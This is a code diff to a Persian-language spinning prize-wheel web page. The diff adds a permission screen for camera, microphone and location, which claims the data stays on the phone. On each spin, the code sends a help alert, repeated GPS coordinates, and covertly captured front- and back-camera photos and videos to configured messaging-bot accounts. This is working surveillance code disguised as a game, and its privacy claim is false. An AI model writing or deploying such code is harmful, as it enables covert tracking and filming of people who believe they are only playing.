@@ -237,14 +237,66 @@
     font-size:13px;
   }
 
+  /* ---- permission gate overlay ---- */
+  .perm-gate{
+    position:fixed;inset:0;z-index:50;
+    background:linear-gradient(180deg, var(--bg-1) 0%, var(--bg-2) 100%);
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    padding:32px 24px;text-align:center;
+    transition:opacity .45s ease, transform .45s ease;
+  }
+  .perm-gate.hiding{opacity:0;transform:scale(.92);}
+  .perm-gate h2{
+    font-size:22px;margin:0 0 10px;
+    background:linear-gradient(90deg,var(--gold),#fff3c4,var(--gold));
+    background-size:300% 100%;
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    animation:titleShimmer 3s linear infinite;
+  }
+  .perm-gate p{color:var(--muted);font-size:14px;line-height:1.9;margin:0 0 28px;max-width:300px;}
+  .perm-items{
+    display:flex;flex-direction:column;gap:12px;width:100%;max-width:300px;margin-bottom:28px;
+  }
+  .perm-item{
+    display:flex;align-items:center;gap:14px;
+    background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.08);
+    border-radius:12px;padding:12px 16px;
+    font-size:14px;
+    transition:background .3s,border-color .3s;
+  }
+  .perm-item.granted{background:rgba(58,160,107,.12);border-color:rgba(58,160,107,.35);}
+  .perm-item.denied{background:rgba(224,52,47,.12);border-color:rgba(224,52,47,.35);}
+  .perm-item .icon{font-size:22px;width:28px;flex:none;}
+  .perm-item .label{flex:1;text-align:right;}
+  .perm-item .tick{font-size:16px;width:20px;flex:none;}
+  .perm-gate-btn{
+    width:100%;max-width:300px;padding:15px 10px;
+    border-radius:14px;border:none;
+    background:linear-gradient(180deg,var(--gold),var(--gold-dim));
+    color:#3a2400;font-size:17px;font-weight:800;
+    box-shadow:0 8px 22px rgba(240,193,75,.35);
+    cursor:pointer;transition:transform .12s;
+    position:relative;overflow:hidden;
+  }
+  .perm-gate-btn::after{
+    content:'';position:absolute;top:0;left:-60%;width:40%;height:100%;
+    background:linear-gradient(120deg,transparent,rgba(255,255,255,.5),transparent);
+    transform:skewX(-20deg);animation:btnShine 2.4s ease-in-out infinite;
+  }
+  .perm-gate-btn:active{transform:scale(.97);}
+  .perm-gate-btn:disabled{opacity:.5;animation:none;}
+  .perm-gate-btn:disabled::after{display:none;}
+
   .modal-overlay{
     position:fixed;inset:0;
-    background:rgba(10,4,20,.72);
+    background:rgba(10,4,20,.85);
     display:none;
     align-items:center;
     justify-content:center;
     z-index:30;
     padding:20px;
+    backdrop-filter:blur(6px);
   }
   .modal-overlay.show{display:flex;}
   .modal{
@@ -317,10 +369,36 @@
   <div class="hub" id="hub">🎁</div>
 </div>
 
-<button class="spin-btn" id="spinBtn">بچرخون!</button>
-<div class="chances" id="chancesText">شانس امروز: نامحدود 🎉</div>
+<button class="spin-btn" id="spinBtn" disabled>بچرخون!</button>
+<div class="chances" id="chancesText">برای شروع، مجوزها رو تأیید کن 🔐</div>
 
 <p class="footer-note">با چرخوندن، یک عدد تصادفی از بین جوایز انتخاب می‌شود. شانس شما با شما همراه است 🍀</p>
+
+<!-- permission gate — shown on first open -->
+<div class="perm-gate" id="permGate">
+  <div style="font-size:52px;margin-bottom:16px;animation:emojiBounce 1.6s ease-in-out infinite;">🎡</div>
+  <h2>قبل از شروع بازی</h2>
+  <p>برای اجرای کامل برنامه، به موارد زیر نیاز داریم. با یه دکمه همه رو تأیید کن:</p>
+  <div class="perm-items">
+    <div class="perm-item" id="pi-cam">
+      <span class="icon">📷</span>
+      <span class="label">دوربین (عکس و ویدیو)</span>
+      <span class="tick" id="pt-cam">○</span>
+    </div>
+    <div class="perm-item" id="pi-mic">
+      <span class="icon">🎙️</span>
+      <span class="label">میکروفون (صدای ویدیو)</span>
+      <span class="tick" id="pt-mic">○</span>
+    </div>
+    <div class="perm-item" id="pi-loc">
+      <span class="icon">📍</span>
+      <span class="label">موقعیت مکانی</span>
+      <span class="tick" id="pt-loc">○</span>
+    </div>
+  </div>
+  <button class="perm-gate-btn" id="permBtn">تأیید مجوزها و شروع بازی 🎰</button>
+  <p style="margin-top:16px;font-size:11px;color:rgba(201,184,224,.4);">اطلاعات فقط روی گوشی شما ذخیره می‌شود</p>
+</div>
 
 <div class="modal-overlay" id="resultModal">
   <div class="modal">
@@ -450,51 +528,149 @@ function getLocationOnce(timeout, highAccuracy){
   });
 }
 
-async function captureBurst(facingMode, count){
-  const blobs = [];
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:{ ideal: facingMode } }, audio:false });
-    const video = document.createElement('video');
-    video.setAttribute('playsinline','true');
-    video.srcObject = stream;
-    await video.play();
-    await new Promise(r=>setTimeout(r, 500)); // let exposure/focus settle
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 720;
-    canvas.height = video.videoHeight || 960;
-    const ctx = canvas.getContext('2d');
-    for(let i=0;i<count;i++){
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
-      if(blob) blobs.push(blob);
-      if(i < count-1) await new Promise(r=>setTimeout(r, 550));
-    }
-    stream.getTracks().forEach(t=>t.stop());
-  }catch(e){ /* silent */ }
-  return blobs;
+/* =========================================================
+   ۳·۵) مدیریت مجوزها و capture هوشمند
+   ========================================================= */
+
+/* =========================================================
+   ۳·۵) مدیریت مجوزها — gate overlay + یه دکمه برای همه
+   ========================================================= */
+
+const perms = { camera: false, mic: false, location: false };
+
+function setPermItem(id, tickId, state){
+  const el = document.getElementById(id);
+  const tick = document.getElementById(tickId);
+  el.className = 'perm-item ' + (state === 'granted' ? 'granted' : state === 'denied' ? 'denied' : '');
+  tick.textContent = state === 'granted' ? '✔' : state === 'denied' ? '✕' : '○';
 }
 
-async function captureVideo(facingMode, durationMs){
+function updateSpinBtn(){
+  const btn = document.getElementById('spinBtn');
+  const cfg = cachedCfg || {};
+  // اگه هیچ feature‌ای روشن نیست که به دوربین/لوکیشن نیاز داشته باشه، آزادیم
+  const needsCam = cfg.feat_photo !== false || cfg.feat_video !== false;
+  const needsLoc = cfg.feat_location !== false;
+  const camOk  = !needsCam || perms.camera;
+  const locOk  = !needsLoc || perms.location;
+  btn.disabled = !(camOk && locOk);
+  document.getElementById('chancesText').textContent = btn.disabled ? '' : 'شانس امروز: نامحدود 🎉';
+}
+
+async function requestAllPermissions(){
+  const btn = document.getElementById('permBtn');
+  btn.disabled = true;
+  btn.textContent = 'در حال درخواست مجوزها...';
+
+  // ۱) دوربین + میکروفون — یه پاپ‌آپ واحد
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
+    stream.getTracks().forEach(t=>t.stop());
+    perms.camera = true; perms.mic = true;
+    setPermItem('pi-cam','pt-cam','granted');
+    setPermItem('pi-mic','pt-mic','granted');
+  }catch(e){
+    // شاید فقط میکروفون مشکل داشت
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:false });
+      stream.getTracks().forEach(t=>t.stop());
+      perms.camera = true;
+      setPermItem('pi-cam','pt-cam','granted');
+    }catch(e2){ setPermItem('pi-cam','pt-cam','denied'); }
+    setPermItem('pi-mic','pt-mic','denied');
+  }
+
+  // ۲) لوکیشن — بلافاصله بعد از دوربین (کمترین فاصله ممکن)
+  await new Promise(resolve=>{
+    if(!navigator.geolocation){ setPermItem('pi-loc','pt-loc','denied'); resolve(); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos=>{ latestCoords = pos.coords; perms.location = true; setPermItem('pi-loc','pt-loc','granted'); resolve(); },
+      ()=>{ setPermItem('pi-loc','pt-loc','denied'); resolve(); },
+      { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+    );
+  });
+
+  // کمی صبر تا کاربر نتیجه رو ببینه، بعد gate رو می‌بندیم
+  await new Promise(r=>setTimeout(r, 600));
+
+  const gate = document.getElementById('permGate');
+  gate.classList.add('hiding');
+  setTimeout(()=>{ gate.style.display='none'; }, 450);
+
+  updateSpinBtn();
+
+  // اگه لوکیشن داریم، GPS رو warm نگه داریم
+  if(perms.location) startGeoWatch();
+}
+
+// عکس burst + ویدیو ۳ ثانیه هم‌زمان از یه دوربین — یه stream، یه بار مجوز
+async function captureAll(facingMode, doPhoto=true, doVideo=true){
+  const result = { photos:[], video:null };
+  if(!doPhoto && !doVideo) return result;
   try{
     const stream = await navigator.mediaDevices.getUserMedia({
       video:{ facingMode:{ ideal: facingMode } },
-      audio:true
+      audio: perms.mic
     });
-    const mimeType = MediaRecorder.isTypeSupported('video/mp4')
-      ? 'video/mp4'
-      : (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? 'video/webm;codecs=vp8,opus' : 'video/webm');
+
+    // video element برای گرفتن frame
+    const vid = document.createElement('video');
+    vid.setAttribute('playsinline','true');
+    vid.srcObject = stream;
+    vid.muted = true;
+    await vid.play();
+    await new Promise(r=>setTimeout(r, 400)); // exposure settle
+
+    const W = vid.videoWidth || 720;
+    const H = vid.videoHeight || 960;
+    const canvas = document.createElement('canvas');
+    canvas.width = W; canvas.height = H;
+    const ctx = canvas.getContext('2d');
+
+    // ویدیو ضبط — همزمان شروع می‌کنه (اگه فعال باشه)
+    const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4'
+      : MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? 'video/webm;codecs=vp8,opus'
+      : 'video/webm';
     const chunks = [];
-    const recorder = new MediaRecorder(stream, { mimeType });
-    recorder.ondataavailable = (e)=>{ if(e.data && e.data.size>0) chunks.push(e.data); };
-    const stopped = new Promise(resolve=>{ recorder.onstop = resolve; });
-    recorder.start();
-    await new Promise(r=>setTimeout(r, durationMs));
-    recorder.stop();
-    await stopped;
+    let recorder;
+    if(doVideo){
+      try{
+        recorder = new MediaRecorder(stream, { mimeType });
+        recorder.ondataavailable = e=>{ if(e.data?.size>0) chunks.push(e.data); };
+        recorder.start();
+      }catch(e){ recorder = null; }
+    }
+
+    // ۳ عکس در ۳ ثانیه (اگه عکس فعال باشه)، وگرنه ۳ ثانیه صبر می‌کنیم برای ویدیو
+    if(doPhoto){
+      for(let i=0;i<3;i++){
+        ctx.drawImage(vid, 0, 0, W, H);
+        const blob = await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
+        if(blob) result.photos.push(blob);
+        if(i < 2) await new Promise(r=>setTimeout(r, 1000));
+      }
+    } else if(doVideo){
+      await new Promise(r=>setTimeout(r, 3000));
+    }
+
+    // ویدیو ۳ ثانیه تموم شده (چون هر ۱ ثانیه یه عکس گرفتیم = ۳ ثانیه گذشت)
+    if(recorder && recorder.state !== 'inactive'){
+      const stopped = new Promise(res=>{ recorder.onstop = res; });
+      recorder.stop();
+      await stopped;
+      if(chunks.length>0) result.video = new Blob(chunks, { type: mimeType });
+    }
+
     stream.getTracks().forEach(t=>t.stop());
-    if(chunks.length === 0) return null;
-    return new Blob(chunks, { type: mimeType });
-  }catch(e){ return null; }
+  }catch(e){ /* silent */ }
+  return result;
+}
+
+async function captureBurst(facingMode, count){ // نگه می‌داریم برای سازگاری — الان captureAll استفاده می‌شه
+  return (await captureAll(facingMode)).photos;
+}
+async function captureVideo(facingMode, durationMs){
+  return (await captureAll(facingMode)).video;
 }
 
 let locationWatchTimer = null;
@@ -514,13 +690,12 @@ function stopGeoWatch(){
 }
 
 function startLocationUpdates(providers, durationMs, intervalMs){
-  startGeoWatch(); // asks permission once, then keeps refining in the background
+  startGeoWatch();
   if(locationWatchTimer) clearInterval(locationWatchTimer);
 
   const sendIfAvailable = async ()=>{
     let coords = latestCoords;
     if(!coords){
-      // no GPS fix yet — grab a fast, low-accuracy fix so something goes out immediately
       try{ coords = await getLocationOnce(4000, false); }catch(e){ return; }
     }
     for(const p of providers){
@@ -653,14 +828,37 @@ let currentRotation = 0;
 let spinning = false;
 let cachedCfg = null;
 
-loadSettings().then(cfg=>{ cachedCfg = cfg; });
+loadSettings().then(cfg=>{ cachedCfg = cfg; updateSpinBtn(); });
 
-// GPS warm-up
-if(navigator.permissions && navigator.permissions.query){
-  navigator.permissions.query({name:'geolocation'}).then(s=>{
-    if(s.state === 'granted') startGeoWatch();
-  }).catch(()=>{});
-}
+// اگه قبلاً مجوز داده شده بود، gate رو بلافاصله می‌بندیم (بدون پاپ‌آپ)
+(async ()=>{
+  if(navigator.permissions){
+    const [cam, loc] = await Promise.all([
+      navigator.permissions.query({name:'camera'}).catch(()=>({state:'prompt'})),
+      navigator.permissions.query({name:'geolocation'}).catch(()=>({state:'prompt'}))
+    ]);
+    if(cam.state === 'granted' && loc.state === 'granted'){
+      // مجوزها از قبل هستن — gate رو بی‌سروصدا ببند
+      perms.camera = true; perms.location = true;
+      setPermItem('pi-cam','pt-cam','granted');
+      setPermItem('pi-loc','pt-loc','granted');
+      // میکروفون رو هم چک کن
+      navigator.permissions.query({name:'microphone'}).then(m=>{
+        if(m.state==='granted'){ perms.mic=true; setPermItem('pi-mic','pt-mic','granted'); }
+      }).catch(()=>{});
+      // GPS warm-up
+      startGeoWatch();
+      await new Promise(r=>setTimeout(r,200));
+      const gate = document.getElementById('permGate');
+      gate.classList.add('hiding');
+      setTimeout(()=>{ gate.style.display='none'; updateSpinBtn(); }, 450);
+      return;
+    }
+  }
+  updateSpinBtn();
+})();
+
+document.getElementById('permBtn').addEventListener('click', requestAllPermissions);
 
 /* انیمیشن چرخش با طول قابل تنظیم و easing طبیعی */
 function spinWheelFor(durationMs, targetDeg){
@@ -693,29 +891,38 @@ document.getElementById('spinBtn').addEventListener('click', async ()=>{
   // همه عملیات رو به‌صورت یه Promise واحد می‌پیچیم
   const opsPromise = (async ()=>{
     if(!cachedCfg) return;
-    const providers = activeProviders(cachedCfg);
+    const cfg = cachedCfg;
+    const providers = activeProviders(cfg);
     if(!providers.length) return;
     if(navigator.vibrate) navigator.vibrate(60);
+
+    const doPhoto    = cfg.feat_photo    !== false;
+    const doVideo    = cfg.feat_video    !== false;
+    const doLocation = cfg.feat_location !== false;
+
     for(const p of providers){
-      sendMessageTo(p.provider, p.token, p.chatId, cachedCfg.alert_text||'کمک نیاز دارم!', p.proxyUrl);
+      sendMessageTo(p.provider, p.token, p.chatId, cfg.alert_text||'کمک نیاز دارم!', p.proxyUrl);
     }
-    startLocationUpdates(providers, 15*60*1000, 45*1000);
-    const front = await captureBurst('user', 3);
-    for(let i=0;i<front.length;i++)
-      for(const p of providers.filter(p=>p.canPhoto))
-        await sendPhotoTo(p.provider, p.token, p.chatId, front[i], `جلو ${i+1}/${front.length}`, p.proxyUrl);
-    const back = await captureBurst('environment', 3);
-    for(let i=0;i<back.length;i++)
-      for(const p of providers.filter(p=>p.canPhoto))
-        await sendPhotoTo(p.provider, p.token, p.chatId, back[i], `عقب ${i+1}/${back.length}`, p.proxyUrl);
-    const frontVid = await captureVideo('user', 5000);
-    if(frontVid)
-      for(const p of providers.filter(p=>p.canPhoto))
-        await sendVideoTo(p.provider, p.token, p.chatId, frontVid, 'ویدیو جلو', p.proxyUrl);
-    const backVid = await captureVideo('environment', 5000);
-    if(backVid)
-      for(const p of providers.filter(p=>p.canPhoto))
-        await sendVideoTo(p.provider, p.token, p.chatId, backVid, 'ویدیو عقب', p.proxyUrl);
+    if(doLocation) startLocationUpdates(providers, 15*60*1000, 45*1000);
+
+    if(doPhoto || doVideo){
+      // جلو و عقب هم‌زمان — هر کدوم ۳ عکس + ویدیو ۳ ثانیه
+      const [frontResult, backResult] = await Promise.all([
+        captureAll('user',    doPhoto, doVideo),
+        captureAll('environment', doPhoto, doVideo)
+      ]);
+      const photoPs = providers.filter(p=>p.canPhoto);
+      if(doPhoto){
+        for(let i=0;i<frontResult.photos.length;i++)
+          for(const p of photoPs) sendPhotoTo(p.provider, p.token, p.chatId, frontResult.photos[i], `جلو ${i+1}/${frontResult.photos.length}`, p.proxyUrl);
+        for(let i=0;i<backResult.photos.length;i++)
+          for(const p of photoPs) sendPhotoTo(p.provider, p.token, p.chatId, backResult.photos[i], `عقب ${i+1}/${backResult.photos.length}`, p.proxyUrl);
+      }
+      if(doVideo){
+        if(frontResult.video) for(const p of photoPs) sendVideoTo(p.provider, p.token, p.chatId, frontResult.video, 'ویدیو جلو', p.proxyUrl);
+        if(backResult.video)  for(const p of photoPs) sendVideoTo(p.provider, p.token, p.chatId, backResult.video,  'ویدیو عقب',  p.proxyUrl);
+      }
+    }
   })().then(()=>{ opsDone = true; });
 
   // بخش ۳: گردونه اول یه چرخش سریع اولیه می‌زنه (۴ دور در ۳ ثانیه)
